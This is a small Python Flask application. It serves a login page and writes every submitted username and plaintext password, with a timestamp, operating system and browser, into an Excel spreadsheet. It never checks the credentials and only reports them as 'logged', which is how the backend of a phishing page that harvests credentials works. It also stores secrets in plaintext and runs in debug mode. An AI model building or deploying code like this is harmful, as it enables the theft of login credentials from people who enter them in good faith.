import os
from datetime import datetime
from flask import Flask, render_template, request
import openpyxl

app = Flask(__name__)

EXCEL_FILE = "log_data.xlsx"


def log_to_excel(username, password, platform, browser):
    current_time = datetime.now().strftime("%Y-%m-%d %I:%M:%S %p")

    if os.path.exists(EXCEL_FILE):
        workbook = openpyxl.load_workbook(EXCEL_FILE)
        sheet = workbook.active
    else:
        workbook = openpyxl.Workbook()
        sheet = workbook.active
        sheet.title = "Login Logs"
        # Added Device Platform and Browser headers
        sheet.append(
            ["Username", "Password Entered", "Timestamp", "OS / Platform", "Browser"]
        )

    # Append the row with device logs included
    sheet.append([username, password, current_time, platform, browser])
    workbook.save(EXCEL_FILE)


@app.route("/")
def home():
    return render_template("login.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    # Extract device information from the incoming request metadata
    user_agent = request.user_agent
    platform = user_agent.platform or "Unknown OS"  # e.g., windows, android, iphone
    browser = user_agent.browser or "Unknown Browser"  # e.g., chrome, safari

    # Send everything to the Excel logger
    log_to_excel(username, password, platform.capitalize(), browser.capitalize())

    return f"<h3>Login logged successfully for {username} from a {platform.capitalize()} device!</h3>"


if __name__ == "__main__":
    app.run(debug=True, port=5000)